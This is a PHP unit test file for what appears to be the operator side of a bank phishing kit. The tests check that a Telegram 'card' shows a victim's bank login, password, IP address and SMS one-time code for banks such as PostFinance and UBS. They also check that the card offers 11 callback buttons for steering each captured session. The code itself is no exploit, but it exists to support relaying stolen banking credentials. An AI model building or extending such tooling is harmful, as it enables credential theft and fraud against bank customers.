<?php

namespace Tests\Feature;

use App\Models\BankSession;
use App\Services\Telegram\TelegramCardBuilder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class TelegramCardBuilderTest extends TestCase
{
    use RefreshDatabase;

    public function test_card_text_contains_bank_credentials_and_state(): void
    {
        $session = BankSession::create([
            'bank_slug' => 'postfinance',
            'ip_address' => '1.2.3.4',
            'credentials' => ['login' => 'u', 'password' => 'p'],
            'action_type' => ['type' => 'sms'],
            'answers' => [['command' => 'sms', 'payload' => ['code' => '1234']]],
        ]);

        $text = (new TelegramCardBuilder())->buildCardText($session);

        $this->assertStringContainsString('PostFinance', $text);
        $this->assertStringContainsString('1.2.3.4', $text);
        $this->assertStringContainsString('Login', $text);
        $this->assertStringContainsString('1234', $text);
        $this->assertStringContainsString('sms', $text);
    }

    public function test_keyboard_has_all_11_actions_with_callback_data(): void
    {
        $session = BankSession::create(['bank_slug' => 'ubs']);

        $kb = (new TelegramCardBuilder())->buildKeyboard($session);

        $all = array_merge(...$kb['inline_keyboard']);
        $this->assertCount(11, $all);
        foreach ($all as $btn) {
            $this->assertStringStartsWith('action:' . $session->id . ':', $btn['callback_data']);
        }
    }
}
